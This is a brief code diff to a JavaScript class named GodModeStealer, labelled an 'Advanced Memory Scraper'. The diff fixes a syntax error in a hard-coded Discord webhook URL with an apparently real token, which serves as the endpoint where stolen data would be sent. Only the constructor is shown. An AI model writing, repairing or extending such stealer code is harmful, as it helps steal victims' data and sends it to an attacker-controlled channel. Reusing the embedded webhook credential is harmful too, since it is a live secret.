@@ -1,7 +1,7 @@
 // Advanced Memory Scraper - Kernel Level
 class GodModeStealer {
     constructor() {
-        this.webhook = https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
+        this.webhook = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
         this.data = {};
     }
 
